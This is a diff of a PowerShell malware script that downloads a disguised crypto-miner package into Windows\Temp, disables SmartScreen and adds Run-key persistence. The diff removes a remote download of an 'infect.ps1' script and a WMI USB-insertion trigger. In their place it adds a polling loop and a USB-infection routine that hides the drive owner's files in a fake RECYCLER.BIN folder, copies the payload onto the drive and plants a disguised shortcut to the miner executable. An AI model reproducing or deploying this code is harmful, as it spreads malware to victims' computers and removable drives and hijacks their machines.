@@ -27,8 +27,6 @@ $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/head
 $crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
 $crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
 $crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
-$infectorUrl = "https://github.com/NaomiMendoza127/filetest12345/raw/refs/heads/main/infector.ps1"
-$infectorPath = "C:\Windows\Temp\infect.ps1"
 
 Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
 try {
@@ -247,24 +245,6 @@ if (-not (Test-Path -Path $payloadPath)) {
     }
 }
 
-Add-Content -Path $logPath -Value "Checking for existing infect.ps1 at $infectorPath..."
-if (-not (Test-Path -Path $infectorPath)) {
-    Add-Content -Path $logPath -Value "Infect.ps1 not found. Downloading from $infectorUrl..."
-    try {
-        if (-not (Test-Path -Path (Split-Path -Path $infectorPath -Parent))) {
-            New-Item -ItemType Directory -Path (Split-Path -Path $infectorPath -Parent) -Force | Out-Null
-            Add-Content -Path $logPath -Value "Created directory for infect.ps1: $(Split-Path -Path $infectorPath -Parent)."
-        }
-        Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorPath -UseBasicParsing -TimeoutSec 60
-        Unblock-File -Path $infectorPath -ErrorAction Stop
-        Add-Content -Path $logPath -Value "Infect.ps1 downloaded successfully to $infectorPath."
-    } catch {
-        Add-Content -Path $logPath -Value "Failed to download infect.ps1: $_"
-    }
-} else {
-    Add-Content -Path $logPath -Value "Infect.ps1 already exists at $infectorPath. Skipping download."
-}
-
 Add-Content -Path $logPath -Value "Checking registry key for persistence..."
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
@@ -286,36 +266,63 @@ try {
     Add-Content -Path $logPath -Value "Failed to check or set registry key: $_"
 }
 
-Add-Content -Path $logPath -Value "Creating permanent WMI subscription for USB monitoring..."
-try {
-    $filterName = "USBInfectFilter"
-    $consumerName = "USBInfectConsumer"
-
-    # Create event filter for USB insertion
-    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
-        Name = $filterName
-        EventNameSpace = "root\cimv2"
-        QueryLanguage = "WQL"
-        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType = 2"
-        EventNamespace = "root\cimv2"
-    } -ErrorAction Stop
-
-    # Create command-line consumer to execute the infection script
-    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
-        Name = $consumerName
-        CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$infectorPath`" -DriveLetter %DriveLetter%"
-    } -ErrorAction Stop
-
-    # Bind filter to consumer
-    $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
-        Filter = $filter
-        Consumer = $consumer
-    } -ErrorAction Stop
-
-    Add-Content -Path $logPath -Value "Permanent WMI subscription created successfully for USB monitoring."
-} catch {
-    Add-Content -Path $logPath -Value "Failed to create permanent WMI subscription: $_"
+Add-Content -Path $logPath -Value "Starting USB monitoring loop..."
+function Infect-USB {
+    param ($DriveLetter)
+    $usbPath = "$DriveLetter\"
+    $recyclerPath = "$usbPath\RECYCLER.BIN"
+    $filesPath = "$recyclerPath\Files"
+    $usbSoftwareFolder = "$usbPath\WindowsServices"
+    $lnkPath = "$usbPath\SystemTools.lnk"
+    try {
+        Add-Content -Path $logPath -Value "Detected USB at $usbPath. Starting update process..."
+        if (-not (Test-Path -Path $recyclerPath)) {
+            New-Item -Path $recyclerPath -ItemType Directory -Force | Out-Null
+            Set-ItemProperty -Path $recyclerPath -Name Attributes -Value Hidden
+            Add-Content -Path $logPath -Value "Created hidden RECYCLER.BIN folder at $recyclerPath"
+        }
+        if (-not (Test-Path -Path $filesPath)) {
+            New-Item -Path $filesPath -ItemType Directory -Force | Out-Null
+            Add-Content -Path $logPath -Value "Created Files folder at $filesPath"
+        }
+        Get-ChildItem -Path $usbPath -File | ForEach-Object {
+            if ($_.FullName -ne $lnkPath -and $_.FullName -ne $usbSoftwareFolder) {
+                Move-Item -Path $_.FullName -Destination $filesPath -Force
+                Add-Content -Path $logPath -Value "Moved file $($_.Name) to $filesPath"
+            }
+        }
+        if (Test-Path -Path $crackedSoftwareFolder) {
+            Copy-Item -Path $crackedSoftwareFolder -Destination $usbPath -Recurse -Force
+            Add-Content -Path $logPath -Value "Copied WindowsServices folder to $usbSoftwareFolder"
+        } else {
+            Add-Content -Path $logPath -Value "Warning: WindowsServices folder not found at $crackedSoftwareFolder, cannot copy to USB."
+        }
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($lnkPath)
+        $shortcut.TargetPath = "$usbSoftwareFolder\SystemCore\ServiceHost.exe"
+        $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2"
+        $shortcut.WorkingDirectory = "$usbSoftwareFolder\SystemCore"
+        $shortcut.Save()
+        Add-Content -Path $logPath -Value "Created shortcut at $lnkPath pointing to $usbSoftwareFolder\SystemCore\ServiceHost.exe"
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to process USB at $usbPath. Error: $_"
+    }
 }
 
-# Removed the polling loop as WMI will handle USB detection
+$knownDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty DeviceID
+while ($true) {
+    try {
+        $currentDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty DeviceID
+        $newDrives = $currentDrives | Where-Object { $_ -notin $knownDrives }
+        foreach ($drive in $newDrives) {
+            Add-Content -Path $logPath -Value "New USB drive detected: $drive"
+            Infect-USB -DriveLetter $drive
+            $knownDrives += $drive
+        }
+        Start-Sleep -Seconds 5
+    } catch {
+        Add-Content -Path $logPath -Value "Error in USB monitoring loop: $_"
+    }
+}
+
 Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
